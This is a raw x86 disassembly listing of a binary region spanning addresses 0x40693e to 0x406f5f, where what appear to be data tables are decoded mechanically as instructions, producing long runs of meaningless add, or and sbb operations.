  40693e:	00 00                	add    %al,(%eax)
  406940:	01 00                	add    %eax,(%eax)
  406942:	63 17                	arpl   %edx,(%edi)
  406944:	00 00                	add    %al,(%eax)
  406946:	02 00                	add    (%eax),%al
  406948:	16                   	push   %ss
  406949:	0e                   	push   %cs
  40694a:	00 00                	add    %al,(%eax)
  40694c:	01 00                	add    %eax,(%eax)
  40694e:	63 17                	arpl   %edx,(%edi)
  406950:	00 00                	add    %al,(%eax)
  406952:	02 00                	add    (%eax),%al
  406954:	69 16 00 00 01 00    	imul   $0x10000,(%esi),%edx
  40695a:	63 17                	arpl   %edx,(%edi)
  40695c:	00 00                	add    %al,(%eax)
  40695e:	02 00                	add    (%eax),%al
  406960:	0c 0e                	or     $0xe,%al
  406962:	00 00                	add    %al,(%eax)
  406964:	01 00                	add    %eax,(%eax)
  406966:	63 17                	arpl   %edx,(%edi)
  406968:	00 00                	add    %al,(%eax)
  40696a:	02 00                	add    (%eax),%al
  40696c:	0c 0e                	or     $0xe,%al
  40696e:	00 00                	add    %al,(%eax)
  406970:	01 00                	add    %eax,(%eax)
  406972:	63 17                	arpl   %edx,(%edi)
  406974:	00 00                	add    %al,(%eax)
  406976:	02 00                	add    (%eax),%al
  406978:	07                   	pop    %es
  406979:	0e                   	push   %cs
  40697a:	00 00                	add    %al,(%eax)
  40697c:	01 00                	add    %eax,(%eax)
  40697e:	63 17                	arpl   %edx,(%edi)
  406980:	00 00                	add    %al,(%eax)
  406982:	02 00                	add    (%eax),%al
  406984:	11 0e                	adc    %ecx,(%esi)
  406986:	00 00                	add    %al,(%eax)
  406988:	01 00                	add    %eax,(%eax)
  40698a:	63 17                	arpl   %edx,(%edi)
  40698c:	00 00                	add    %al,(%eax)
  40698e:	02 00                	add    (%eax),%al
  406990:	11 0e                	adc    %ecx,(%esi)
  406992:	00 00                	add    %al,(%eax)
  406994:	01 00                	add    %eax,(%eax)
  406996:	e6 06                	out    %al,$0x6
  406998:	00 00                	add    %al,(%eax)
  40699a:	01 00                	add    %eax,(%eax)
  40699c:	e4 17                	in     $0x17,%al
  40699e:	00 00                	add    %al,(%eax)
  4069a0:	02 00                	add    (%eax),%al
  4069a2:	e8 1a 00 00 01       	call   0x14069c1
  4069a7:	00 0a                	add    %cl,(%edx)
  4069a9:	18 00                	sbb    %al,(%eax)
  4069ab:	00 01                	add    %al,(%ecx)
  4069ad:	00 cc                	add    %cl,%ah
  4069af:	0c 00                	or     $0x0,%al
  4069b1:	00 01                	add    %al,(%ecx)
  4069b3:	00 8e 18 00 00 01    	add    %cl,0x1000018(%esi)
  4069b9:	00 a2 16 00 00 01    	add    %ah,0x1000016(%edx)
  4069bf:	00 ea                	add    %ch,%dl
  4069c1:	12 00                	adc    (%eax),%al
  4069c3:	00 02                	add    %al,(%edx)
  4069c5:	00 2b                	add    %ch,(%ebx)
  4069c7:	0b 00                	or     (%eax),%eax
  4069c9:	00 01                	add    %al,(%ecx)
  4069cb:	00 35 00 00 00 02    	add    %dh,0x2000000
  4069d1:	00 9b 00 00 00 03    	add    %bl,0x3000000(%ebx)
  4069d7:	00 9e 00 00 00 01    	add    %bl,0x1000000(%esi)
  4069dd:	00 5e 07             	add    %bl,0x7(%esi)
  4069e0:	00 00                	add    %al,(%eax)
  4069e2:	02 00                	add    (%eax),%al
  4069e4:	8c 0a                	mov    %cs,(%edx)
  4069e6:	00 00                	add    %al,(%eax)
  4069e8:	01 00                	add    %eax,(%eax)
  4069ea:	8c 0a                	mov    %cs,(%edx)
  4069ec:	00 00                	add    %al,(%eax)
  4069ee:	01 00                	add    %eax,(%eax)
  4069f0:	5e                   	pop    %esi
  4069f1:	07                   	pop    %es
  4069f2:	00 00                	add    %al,(%eax)
  4069f4:	01 00                	add    %eax,(%eax)
  4069f6:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4069f7:	02 00                	add    (%eax),%al
  4069f9:	00 01                	add    %al,(%ecx)
  4069fb:	00 c1                	add    %al,%cl
  4069fd:	0d 00 00 01 00       	or     $0x10000,%eax
  406a02:	e5 1b                	in     $0x1b,%eax
  406a04:	00 00                	add    %al,(%eax)
  406a06:	01 00                	add    %eax,(%eax)
  406a08:	81 1c 00 00 01 00 7c 	sbbl   $0x7c000100,(%eax,%eax,1)
  406a0f:	1b 00                	sbb    (%eax),%eax
  406a11:	00 01                	add    %al,(%ecx)
  406a13:	00 7c 1b 00          	add    %bh,0x0(%ebx,%ebx,1)
  406a17:	00 01                	add    %al,(%ecx)
  406a19:	00 7c 1b 00          	add    %bh,0x0(%ebx,%ebx,1)
  406a1d:	00 01                	add    %al,(%ecx)
  406a1f:	00 7c 1b 00          	add    %bh,0x0(%ebx,%ebx,1)
  406a23:	00 01                	add    %al,(%ecx)
  406a25:	00 32                	add    %dh,(%edx)
  406a27:	00 00                	add    %al,(%eax)
  406a29:	00 02                	add    %al,(%edx)
  406a2b:	00 87 00 00 00 01    	add    %al,0x1000000(%edi)
  406a31:	00 7c 1b 00          	add    %bh,0x0(%ebx,%ebx,1)
  406a35:	00 01                	add    %al,(%ecx)
  406a37:	00 7c 1b 00          	add    %bh,0x0(%ebx,%ebx,1)
  406a3b:	00 01                	add    %al,(%ecx)
  406a3d:	00 7c 1b 00          	add    %bh,0x0(%ebx,%ebx,1)
  406a41:	00 01                	add    %al,(%ecx)
  406a43:	00 7c 1b 06          	add    %bh,0x6(%ebx,%ebx,1)
  406a47:	00 2d 00 08 00 35    	add    %ch,0x35000800
  406a4d:	00 59 00             	add    %bl,0x0(%ecx)
  406a50:	b6 1a                	mov    $0x1a,%dh
  406a52:	04 01                	add    $0x1,%al
  406a54:	59                   	pop    %ecx
  406a55:	00 a1 1b 08 01 59    	add    %ah,0x5901081b(%ecx)
  406a5b:	00 83 19 0e 00 69    	add    %al,0x69000e19(%ebx)
  406a61:	00 90 14 b2 01 c9    	add    %dl,-0x36fe4dec(%eax)
  406a67:	00 a8 14 fa 02 d1    	add    %ch,-0x2efd05ec(%eax)
  406a6d:	00 a8 14 0e 00 d9    	add    %ch,-0x26fff1ec(%eax)
  406a73:	00 a8 14 27 03 e9    	add    %ch,-0x16fcd8ec(%eax)
  406a79:	00 a8 14 53 01 f1    	add    %ch,-0xefeacec(%eax)
  406a7f:	00 a8 14 53 01 f9    	add    %ch,-0x6feacec(%eax)
  406a85:	00 a8 14 53 01 01    	add    %ch,0x1015314(%eax)
  406a8b:	01 a8 14 53 01 09    	add    %ebp,0x9015314(%eax)
  406a91:	01 a8 14 53 01 11    	add    %ebp,0x11015314(%eax)
  406a97:	01 a8 14 53 01 19    	add    %ebp,0x19015314(%eax)
  406a9d:	01 a8 14 53 01 21    	add    %ebp,0x21015314(%eax)
  406aa3:	01 a8 14 99 01 29    	add    %ebp,0x29019914(%eax)
  406aa9:	01 a8 14 53 01 31    	add    %ebp,0x31015314(%eax)
  406aaf:	01 a8 14 53 01 39    	add    %ebp,0x39015314(%eax)
  406ab5:	01 a8 14 0e 00 41    	add    %ebp,0x41000e14(%eax)
  406abb:	01 a8 14 53 01 49    	add    %ebp,0x49015314(%eax)
  406ac1:	01 22                	add    %esp,(%edx)
  406ac3:	12 7f 00             	adc    0x0(%edi),%bh
  406ac6:	51                   	push   %ecx
  406ac7:	01 6e 00             	add    %ebp,0x0(%esi)
  406aca:	bd 03 59 01 ab       	mov    $0xab015903,%ebp
  406acf:	19 7f 00             	sbb    %edi,0x0(%edi)
  406ad2:	51                   	push   %ecx
  406ad3:	01 05 10 84 00 61    	add    %eax,0x61008410
  406ad9:	01 a8 14 0e 00 61    	add    %ebp,0x61000e14(%eax)
  406adf:	01 a5 1b c2 03 09    	add    %esp,0x903c21b(%ebp)
  406ae5:	00 a8 14 0e 00 69    	add    %ch,0x69000e14(%eax)
  406aeb:	01 37                	add    %esi,(%edi)
  406aed:	01 cc                	add    %ecx,%esp
  406aef:	03 51 01             	add    0x1(%ecx),%edx
  406af2:	e4 0b                	in     $0xb,%al
  406af4:	c7 00 69 01 73 0c    	movl   $0xc730169,(%eax)
  406afa:	d2 03                	rolb   %cl,(%ebx)
  406afc:	11 00                	adc    %eax,(%eax)
  406afe:	a8 14                	test   $0x14,%al
  406b00:	79 01                	jns    0x406b03
  406b02:	11 00                	adc    %eax,(%eax)
  406b04:	6a 1c                	push   $0x1c
  406b06:	d8 03                	fadds  (%ebx)
  406b08:	71 01                	jno    0x406b0b
  406b0a:	35 1c de 03 69       	xor    $0x6903de1c,%eax
  406b0f:	01 56 16             	add    %edx,0x16(%esi)
  406b12:	e4 03                	in     $0x3,%al
  406b14:	89 01                	mov    %eax,(%ecx)
  406b16:	d3 01                	roll   %cl,(%ecx)
  406b18:	6b 02 81             	imul   $0xffffff81,(%edx),%eax
  406b1b:	01 de                	add    %ebx,%esi
  406b1d:	0c ea                	or     $0xea,%al
  406b1f:	03 19                	add    (%ecx),%ebx
  406b21:	00 a8 14 08 04 19    	add    %ch,0x19040814(%eax)
  406b27:	00 0b                	add    %cl,(%ebx)
  406b29:	0b fa                	or     %edx,%edi
  406b2b:	02 19                	add    (%ecx),%bl
  406b2d:	00 f8                	add    %bh,%al
  406b2f:	0a fa                	or     %dl,%bh
  406b31:	02 c9                	add    %cl,%cl
  406b33:	01 0f                	add    %ecx,(%edi)
  406b35:	1d a5 02 c9 01       	sbb    $0x1c902a5,%eax
  406b3a:	9f                   	lahf
  406b3b:	19 15 04 61 01 a5    	sbb    %edx,0xa5016104
  406b41:	1b 1c 04             	sbb    (%esp,%eax,1),%ebx
  406b44:	d9 01                	flds   (%ecx)
  406b46:	93                   	xchg   %eax,%ebx
  406b47:	15 21 04 19 00       	adc    $0x190421,%eax
  406b4c:	06                   	push   %es
  406b4d:	19 29                	sbb    %ebp,(%ecx)
  406b4f:	04 19                	add    $0x19,%al
  406b51:	00 31                	add    %dh,(%ecx)
  406b53:	03 08                	add    (%eax),%ecx
  406b55:	01 19                	add    %ebx,(%ecx)
  406b57:	00 06                	add    %al,(%esi)
  406b59:	19 8a 01 a1 01 a8    	sbb    %ecx,-0x57fe5eff(%edx)
  406b5f:	14 0e                	adc    $0xe,%al
  406b61:	00 a9 01 a8 14 84    	add    %ch,-0x7beb57ff(%ecx)
  406b67:	01 a1 01 0d 17 31    	add    %esp,0x31170d01(%ecx)
  406b6d:	04 a1                	add    $0xa1,%al
  406b6f:	01 0f                	add    %ecx,(%edi)
  406b71:	0c de                	or     $0xde,%al
  406b73:	02 c9                	add    %cl,%cl
  406b75:	01 9f 19 38 04 f1    	add    %ebx,-0xefbc7e7(%edi)
  406b7b:	01 2f                	add    %ebp,(%edi)
  406b7d:	08 0e                	or     %cl,(%esi)
  406b7f:	00 f9                	add    %bh,%cl
  406b81:	01 a8 14 42 04 01    	add    %ebp,0x1044214(%eax)
  406b87:	02 a8 14 49 04 21    	add    0x21044914(%eax),%ch
  406b8d:	00 a8 14 4f 04 19    	add    %ch,0x19044f14(%eax)
  406b93:	00 fa                	add    %bh,%dl
  406b95:	1a 59 04             	sbb    0x4(%ecx),%bl
  406b98:	09 00                	or     %eax,(%eax)
  406b9a:	2a 0c 95 01 21 00 36 	sub    0x36002101(,%edx,4),%cl
  406ba1:	1a 5f 04             	sbb    0x4(%edi),%bl
  406ba4:	29 02                	sub    %eax,(%edx)
  406ba6:	a8 14                	test   $0x14,%al
  406ba8:	49                   	dec    %ecx
  406ba9:	04 29                	add    $0x29,%al
  406bab:	00 a8 14 6b 04 31    	add    %ch,0x31046b14(%eax)
  406bb1:	02 a8 14 49 04 71    	add    0x71044914(%eax),%ch
  406bb7:	00 04 03             	add    %al,(%ebx,%eax,1)
  406bba:	75 04                	jne    0x406bc0
  406bbc:	39 02                	cmp    %eax,(%edx)
  406bbe:	50                   	push   %eax
  406bbf:	07                   	pop    %es
  406bc0:	82 04 31 00          	addb   $0x0,(%ecx,%esi,1)
  406bc4:	1d 17 89 04 29       	sbb    $0x29048917,%eax
  406bc9:	00 2f                	add    %ch,(%edi)
  406bcb:	08 0e                	or     %cl,(%esi)
  406bcd:	00 71 00             	add    %dh,0x0(%ecx)
  406bd0:	2f                   	das
  406bd1:	08 0e                	or     %cl,(%esi)
  406bd3:	00 19                	add    %bl,(%ecx)
  406bd5:	00 2f                	add    %ch,(%edi)
  406bd7:	08 0e                	or     %cl,(%esi)
  406bd9:	00 71 00             	add    %dh,0x0(%ecx)
  406bdc:	fc                   	cld
  406bdd:	02 94 04 49 02 6e 00 	add    0x6e0249(%esp,%eax,1),%dl
  406be4:	9a 04 71 00 09 03 a1 	lcall  $0xa103,$0x9007104
  406beb:	04 51                	add    $0x51,%al
  406bed:	02 a8 14 49 04 49    	add    0x49044914(%eax),%ch
  406bf3:	01 a8 14 a9 04 49    	add    %ebp,0x4904a914(%eax)
  406bf9:	01 59 1b             	add    %ebx,0x1b(%ecx)
  406bfc:	b0 04                	mov    $0x4,%al
  406bfe:	61                   	popa
  406bff:	02 29                	add    (%ecx),%ch
  406c01:	14 c2                	adc    $0xc2,%al
  406c03:	04 49                	add    $0x49,%al
  406c05:	02 56 16             	add    0x16(%esi),%dl
  406c08:	e0 00                	loopne 0x406c0a
  406c0a:	19 00                	sbb    %eax,(%eax)
  406c0c:	d0 0e                	rorb   $1,(%esi)
  406c0e:	c9                   	leave
  406c0f:	04 71                	add    $0x71,%al
  406c11:	00 ad 08 d1 04 59    	add    %ch,0x5904d108(%ebp)
  406c17:	02 a8 14 79 01 71    	add    0x71017914(%eax),%ch
  406c1d:	00 3c 11             	add    %bh,(%ecx,%edx,1)
  406c20:	63 01                	arpl   %eax,(%ecx)
  406c22:	71 00                	jno    0x406c24
  406c24:	e9 0c 0e 00 61       	jmp    0x61407a35
  406c29:	02 ab 19 9a 00 c9    	add    -0x36ff65e7(%ebx),%ch
  406c2f:	01 7b 18             	add    %edi,0x18(%ebx)
  406c32:	d9 04 71             	flds   (%ecx,%esi,2)
  406c35:	02 fe                	add    %dh,%bh
  406c37:	18 0a                	sbb    %cl,(%edx)
  406c39:	00 79 02             	add    %bh,0x2(%ecx)
  406c3c:	a8 14                	test   $0x14,%al
  406c3e:	0e                   	push   %cs
  406c3f:	00 c9                	add    %cl,%cl
  406c41:	01 87 18 e9 04 79    	add    %eax,0x7904e918(%edi)
  406c47:	02 a3 04 ef 04 49    	add    0x4904ef04(%ebx),%ah
  406c4d:	02 56 16             	add    0x16(%esi),%dl
  406c50:	da 00                	fiaddl (%eax)
  406c52:	49                   	dec    %ecx
  406c53:	02 56 16             	add    0x16(%esi),%dl
  406c56:	ec                   	in     (%dx),%al
  406c57:	00 51 00             	add    %dl,0x0(%ecx)
  406c5a:	a8 14                	test   $0x14,%al
  406c5c:	0e                   	push   %cs
  406c5d:	00 0c 00             	add    %cl,(%eax,%eax,1)
  406c60:	65 0f 04             	gs (bad)
  406c63:	05 0c 00 0d 1b       	add    $0x1b0d000c,%eax
  406c68:	3d 01 c9 01 3c       	cmp    $0x3c01c901,%eax
  406c6d:	14 95                	adc    $0x95,%al
  406c6f:	01 0c 00             	add    %ecx,(%eax,%eax,1)
  406c72:	62 12                	bound  %edx,(%edx)
  406c74:	0e                   	push   %cs
  406c75:	00 0c 00             	add    %cl,(%eax,%eax,1)
  406c78:	1f                   	pop    %ds
  406c79:	03 0f                	add    (%edi),%ecx
  406c7b:	05 0c 00 90 14       	add    $0x1490000c,%eax
  406c80:	24 05                	and    $0x5,%al
  406c82:	14 00                	adc    $0x0,%al
  406c84:	b6 1a                	mov    $0x1a,%dh
  406c86:	36 05 c9 01 1d 17    	ss add $0x171d01c9,%eax
  406c8c:	90                   	nop
  406c8d:	01 14 00             	add    %edx,(%eax,%eax,1)
  406c90:	a1 1b 08 01 71       	mov    0x7101081b,%eax
  406c95:	00 59 0a             	add    %bl,0xa(%ecx)
  406c98:	43                   	inc    %ebx
  406c99:	05 49 02 56 16       	add    $0x16560249,%eax
  406c9e:	e6 00                	out    %al,$0x0
  406ca0:	51                   	push   %ecx
  406ca1:	01 ad 00 4d 05 c9    	add    %ebp,-0x36fab300(%ebp)
  406ca7:	01 cf                	add    %ecx,%edi
  406ca9:	0f 95 01             	setne  (%ecx)
  406cac:	91                   	xchg   %eax,%ecx
  406cad:	02 37                	add    (%edi),%dh
  406caf:	08 52 05             	or     %dl,0x5(%edx)
  406cb2:	51                   	push   %ecx
  406cb3:	01 ad 00 57 05 51    	add    %ebp,0x51055700(%ebp)
  406cb9:	01 ad 00 5c 05 51    	add    %ebp,0x51055c00(%ebp)
  406cbf:	01 ad 00 61 05 51    	add    %ebp,0x51056100(%ebp)
  406cc5:	01 ce                	add    %ecx,%esi
  406cc7:	00 68 05             	add    %ch,0x5(%eax)
  406cca:	89 02                	mov    %eax,(%edx)
  406ccc:	37                   	aaa
  406ccd:	08 6d 05             	or     %ch,0x5(%ebp)
  406cd0:	51                   	push   %ecx
  406cd1:	01 ce                	add    %ecx,%esi
  406cd3:	00 72 05             	add    %dh,0x5(%edx)
  406cd6:	51                   	push   %ecx
  406cd7:	01 ce                	add    %ecx,%esi
  406cd9:	00 77 05             	add    %dh,0x5(%edi)
  406cdc:	51                   	push   %ecx
  406cdd:	01 ce                	add    %ecx,%esi
  406cdf:	00 7c 05 51          	add    %bh,0x51(%ebp,%eax,1)
  406ce3:	01 8e 05 83 05 99    	add    %ecx,-0x66fa7cfb(%esi)
  406ce9:	02 37                	add    (%edi),%dh
  406ceb:	08 88 05 49 02 56    	or     %cl,0x56024905(%eax)
  406cf1:	16                   	push   %ss
  406cf2:	95                   	xchg   %eax,%ebp
  406cf3:	05 a9 02 e6 1c       	add    $0x1ce602a9,%eax
  406cf8:	71 01                	jno    0x406cfb
  406cfa:	b9 02 64 18 84       	mov    $0x84186402,%ecx
  406cff:	00 b1 02 a8 14 a6    	add    %dh,-0x59eb57fe(%ecx)
  406d05:	05 71 00 24 0d       	add    $0xd240071,%eax
  406d0a:	71 01                	jno    0x406d0d
  406d0c:	71 00                	jno    0x406d0e
  406d0e:	29 08                	sub    %ecx,(%eax)
  406d10:	0e                   	push   %cs
  406d11:	00 b1 02 a8 14 b4    	add    %dh,-0x4beb57fe(%ecx)
  406d17:	05 d9 02 f9 1b       	add    $0x1bf902d9,%eax
  406d1c:	c8 05 59 02          	enter  $0x5905,$0x2
  406d20:	a8 14                	test   $0x14,%al
  406d22:	0e                   	push   %cs
  406d23:	00 71 00             	add    %dh,0x0(%ecx)
  406d26:	50                   	push   %eax
  406d27:	0a 3d 01 91 01 a8    	or     0xa8019101,%bh
  406d2d:	14 53                	adc    $0x53,%al
  406d2f:	01 49 02             	add    %ecx,0x2(%ecx)
  406d32:	e0 00                	loopne 0x406d34
  406d34:	de 05 49 02 0b 06    	fiadds 0x60b0249
  406d3a:	e5 05                	in     $0x5,%eax
  406d3c:	49                   	dec    %ecx
  406d3d:	02 8e 05 ec 05 49    	add    0x4905ec05(%esi),%cl
  406d43:	02 65 00             	add    0x0(%ebp),%ah
  406d46:	f3 05 49 02 ad 00    	repz add $0xad0249,%eax
  406d4c:	fa                   	cli
  406d4d:	05 49 02 e9 00       	add    $0xe90249,%eax
  406d52:	01 06                	add    %eax,(%esi)
  406d54:	49                   	dec    %ecx
  406d55:	02 ce                	add    %dh,%cl
  406d57:	00 08                	add    %cl,(%eax)
  406d59:	06                   	push   %es
  406d5a:	0c 00                	or     $0x0,%al
  406d5c:	a8 14                	test   $0x14,%al
  406d5e:	0e                   	push   %cs
  406d5f:	00 49 02             	add    %cl,0x2(%ecx)
  406d62:	56                   	push   %esi
  406d63:	16                   	push   %ss
  406d64:	3a 06                	cmp    (%esi),%al
  406d66:	59                   	pop    %ecx
  406d67:	01 6b 15             	add    %ebp,0x15(%ebx)
  406d6a:	6b 02 19             	imul   $0x19,(%edx),%eax
  406d6d:	03 a7 07 d9 04 f9    	add    -0x6fb26f9(%edi),%esp
  406d73:	02 a8 14 53 01 81    	add    -0x7efeacec(%eax),%ch
  406d79:	00 f8                	add    %bh,%al
  406d7b:	17                   	pop    %ss
  406d7c:	5d                   	pop    %ebp
  406d7d:	06                   	push   %es
  406d7e:	81 00 67 06 62 06    	addl   $0x6620667,(%eax)
  406d84:	21 03                	and    %eax,(%ebx)
  406d86:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  406d87:	06                   	push   %es
  406d88:	95                   	xchg   %eax,%ebp
  406d89:	01 29                	add    %ebp,(%ecx)
  406d8b:	03 12                	add    (%edx),%edx
  406d8d:	07                   	pop    %es
  406d8e:	95                   	xchg   %eax,%ebp
  406d8f:	01 c9                	add    %ecx,%ecx
  406d91:	01 1b                	add    %ebx,(%ebx)
  406d93:	1d a5 02 81 00       	sbb    $0x8102a5,%eax
  406d98:	86 15 68 06 81 00    	xchg   %dl,0x810668
  406d9e:	cb                   	lret
  406d9f:	0e                   	push   %cs
  406da0:	0e                   	push   %cs
  406da1:	00 81 00 a8 14 0e    	add    %al,0xe14a800(%ecx)
  406da7:	00 01                	add    %al,(%ecx)
  406da9:	03 a8 14 0e 00 01    	add    0x1000e14(%eax),%ebp
  406daf:	03 b4 06 53 01 19 03 	add    0x3190153(%esi,%eax,1),%esi
  406db6:	78 10                	js     0x406dc8
  406db8:	6b 02 c9             	imul   $0xffffffc9,(%edx),%eax
  406dbb:	01 7b 18             	add    %edi,0x18(%ebx)
  406dbe:	6e                   	outsb  %ds:(%esi),(%dx)
  406dbf:	06                   	push   %es
  406dc0:	01 03                	add    %eax,(%ebx)
  406dc2:	43                   	inc    %ebx
  406dc3:	18 53 01             	sbb    %dl,0x1(%ebx)
  406dc6:	01 03                	add    %eax,(%ebx)
  406dc8:	84 06                	test   %al,(%esi)
  406dca:	74 06                	je     0x406dd2
  406dcc:	01 03                	add    %eax,(%ebx)
  406dce:	b8 1b 99 01 81       	mov    $0x8101991b,%eax
  406dd3:	00 f3                	add    %dh,%bl
  406dd5:	11 7b 06             	adc    %edi,0x6(%ebx)
  406dd8:	81 00 59 1b 08 01    	addl   $0x1081b59,(%eax)
  406dde:	39 03                	cmp    %eax,(%ebx)
  406de0:	05 14 82 06 41       	add    $0x41068214,%eax
  406de5:	03 3d 08 6b 02 09    	add    0x9026b08,%edi
  406deb:	03 5f 1c             	add    0x1c(%edi),%ebx
  406dee:	87 06                	xchg   %eax,(%esi)
  406df0:	c9                   	leave
  406df1:	01 7b 18             	add    %edi,0x18(%ebx)
  406df4:	91                   	xchg   %eax,%ecx
  406df5:	06                   	push   %es
  406df6:	09 03                	or     %eax,(%ebx)
  406df8:	83 0a 98             	orl    $0xffffff98,(%edx)
  406dfb:	06                   	push   %es
  406dfc:	b9 02 9d 08 b1       	mov    $0xb1089d02,%ecx
  406e01:	02 b9 02 09 16 c7    	add    -0x38e9f6fe(%ecx),%bh
  406e07:	00 61 01             	add    %ah,0x1(%ecx)
  406e0a:	5f                   	pop    %edi
  406e0b:	16                   	push   %ss
  406e0c:	79 01                	jns    0x406e0f
  406e0e:	19 03                	sbb    %eax,(%ebx)
  406e10:	c1 06 67             	roll   $0x67,(%esi)
  406e13:	02 11                	add    (%ecx),%dl
  406e15:	03 a8 14 53 01 51    	add    0x51015314(%eax),%ebp
  406e1b:	03 9d 07 53 01 19    	add    0x19015307(%ebp),%ebx
  406e21:	03 02                	add    (%edx),%eax
  406e23:	0d 67 02 19 03       	or     $0x3190267,%eax
  406e28:	d1 06                	roll   $1,(%esi)
  406e2a:	6b 02 01             	imul   $0x1,(%edx),%eax
  406e2d:	03 ac 0c 99 01 01 03 	add    0x3010199(%esp,%ecx,1),%ebp
  406e34:	3c 0a                	cmp    $0xa,%al
  406e36:	99                   	cltd
  406e37:	01 81 00 59 1b 9e    	add    %eax,-0x61e4a700(%ecx)
  406e3d:	06                   	push   %es
  406e3e:	59                   	pop    %ecx
  406e3f:	01 6c 1b b1          	add    %ebp,-0x4f(%ebx,%ebx,1)
  406e43:	02 59 01             	add    0x1(%ecx),%bl
  406e46:	ef                   	out    %eax,(%dx)
  406e47:	1c 67                	sbb    $0x67,%al
  406e49:	02 19                	add    (%ecx),%bl
  406e4b:	03 2a                	add    (%edx),%ebp
  406e4d:	1b 6b 02             	sbb    0x2(%ebx),%ebp
  406e50:	59                   	pop    %ecx
  406e51:	03 a8 14 53 01 59    	add    0x59015314(%eax),%ebp
  406e57:	03 cc                	add    %esp,%ecx
  406e59:	0a 71 01             	or     0x1(%ecx),%dh
  406e5c:	61                   	popa
  406e5d:	03 a8 14 0e 00 61    	add    0x61000e14(%eax),%ebp
  406e63:	03 03                	add    (%ebx),%eax
  406e65:	07                   	pop    %es
  406e66:	95                   	xchg   %eax,%ebp
  406e67:	01 c9                	add    %ecx,%ecx
  406e69:	01 6a 17             	add    %ebp,0x17(%edx)
  406e6c:	90                   	nop
  406e6d:	01 69 03             	add    %ebp,0x3(%ecx)
  406e70:	a8 14                	test   $0x14,%al
  406e72:	53                   	push   %ebx
  406e73:	01 69 03             	add    %ebp,0x3(%ecx)
  406e76:	18 19                	sbb    %bl,(%ecx)
  406e78:	bc 06 71 03 90       	mov    $0x90037106,%esp
  406e7d:	14 c2                	adc    $0xc2,%al
  406e7f:	06                   	push   %es
  406e80:	79 03                	jns    0x406e85
  406e82:	b6 1a                	mov    $0x1a,%dh
  406e84:	c8 06 81 03          	enter  $0x8106,$0x3
  406e88:	65 0f ce             	gs bswap %esi
  406e8b:	06                   	push   %es
  406e8c:	c9                   	leave
  406e8d:	01 d2                	add    %edx,%edx
  406e8f:	19 95 01 79 03 a1    	sbb    %edx,-0x5efc86ff(%ebp)
  406e95:	1b 08                	sbb    (%eax),%ecx
  406e97:	01 81 00 a2 05 d8    	add    %eax,-0x27fa5e00(%ecx)
  406e9d:	06                   	push   %es
  406e9e:	89 03                	mov    %eax,(%ebx)
  406ea0:	6e                   	outsb  %ds:(%esi),(%dx)
  406ea1:	00 3d 01 81 00 f5    	add    %bh,0xf5008101
  406ea7:	02 3d 01 91 03 2a    	add    0x2a039101,%bh
  406ead:	0c 95                	or     $0x95,%al
  406eaf:	01 99 03 67 1b f6    	add    %ebx,-0x9e498fd(%ecx)
  406eb5:	06                   	push   %es
  406eb6:	99                   	cltd
  406eb7:	03 b5 19 09 07 59    	add    0x59070919(%ebp),%esi
  406ebd:	01 17                	add    %edx,(%edi)
  406ebf:	1b 7b 00             	sbb    0x0(%ebx),%edi
  406ec2:	59                   	pop    %ecx
  406ec3:	01 31                	add    %esi,(%ecx)
  406ec5:	07                   	pop    %es
  406ec6:	67 02 59 01          	add    0x1(%bx,%di),%bl
  406eca:	f3 06                	repz push %es
  406ecc:	67 02 59 01          	add    0x1(%bx,%di),%bl
  406ed0:	94                   	xchg   %eax,%esp
  406ed1:	10 1a                	adc    %bl,(%edx)
  406ed3:	07                   	pop    %es
  406ed4:	c9                   	leave
  406ed5:	01 7b 18             	add    %edi,0x18(%ebx)
  406ed8:	20 07                	and    %al,(%edi)
  406eda:	b1 03                	mov    $0x3,%cl
  406edc:	a8 14                	test   $0x14,%al
  406ede:	0e                   	push   %cs
  406edf:	00 69 01             	add    %ch,0x1(%ecx)
  406ee2:	43                   	inc    %ebx
  406ee3:	02 cc                	add    %ah,%cl
  406ee5:	03 b9 03 c0 0c e3    	add    -0x1cf33ffd(%ecx),%edi
  406eeb:	02 21                	add    (%ecx),%ah
  406eed:	02 2a                	add    (%edx),%ch
  406eef:	0c de                	or     $0xde,%al
  406ef1:	02 c9                	add    %cl,%cl
  406ef3:	01 8e 0c 32 07 c9    	add    %ecx,-0x36f8cdf4(%esi)
  406ef9:	01 ea                	add    %ebp,%edx
  406efb:	13 95 01 c9 01 bc    	adc    -0x43fe36ff(%ebp),%edx
  406f01:	04 3f                	add    $0x3f,%al
  406f03:	07                   	pop    %es
  406f04:	59                   	pop    %ecx
  406f05:	01 6e 0f             	add    %ebp,0xf(%esi)
  406f08:	1d 00 f1 02 2a       	sbb    $0x2a02f100,%eax
  406f0d:	0c 95                	or     $0x95,%al
  406f0f:	01 c1                	add    %eax,%ecx
  406f11:	03 ef                	add    %edi,%ebp
  406f13:	0c 67                	or     $0x67,%al
  406f15:	02 29                	add    (%ecx),%ch
  406f17:	03 6c 07 45          	add    0x45(%edi,%eax,1),%ebp
  406f1b:	07                   	pop    %es
  406f1c:	a9 02 7e 07 45       	test   $0x45077e02,%eax
  406f21:	07                   	pop    %es
  406f22:	a9 02 2a 0c 95       	test   $0x950c2a02,%eax
  406f27:	01 c9                	add    %ecx,%ecx
  406f29:	03 c2                	add    %edx,%eax
  406f2b:	1a 4b 07             	sbb    0x7(%ebx),%cl
  406f2e:	d1 03                	roll   $1,(%ebx)
  406f30:	a8 14                	test   $0x14,%al
  406f32:	51                   	push   %ecx
  406f33:	07                   	pop    %es
  406f34:	d1 03                	roll   $1,(%ebx)
  406f36:	4b                   	dec    %ebx
  406f37:	06                   	push   %es
  406f38:	58                   	pop    %eax
  406f39:	07                   	pop    %es
  406f3a:	19 00                	sbb    %eax,(%eax)
  406f3c:	29 08                	sub    %ecx,(%eax)
  406f3e:	0e                   	push   %cs
  406f3f:	00 69 03             	add    %ch,0x3(%ecx)
  406f42:	a8 14                	test   $0x14,%al
  406f44:	84 01                	test   %al,(%ecx)
  406f46:	24 00                	and    $0x0,%al
  406f48:	a8 14                	test   $0x14,%al
  406f4a:	0e                   	push   %cs
  406f4b:	00 24 00             	add    %ah,(%eax,%eax,1)
  406f4e:	1f                   	pop    %ds
  406f4f:	03 0f                	add    (%edi),%ecx
  406f51:	05 24 00 0d 1b       	add    $0x1b0d0024,%eax
  406f56:	3d 01 24 00 16       	cmp    $0x16002401,%eax
  406f5b:	1c 77                	sbb    $0x77,%al
  406f5d:	07                   	pop    %es
  406f5e:	c9                   	leave
  406f5f:	01 73 10             	add    %esi,0x10(%ebx)
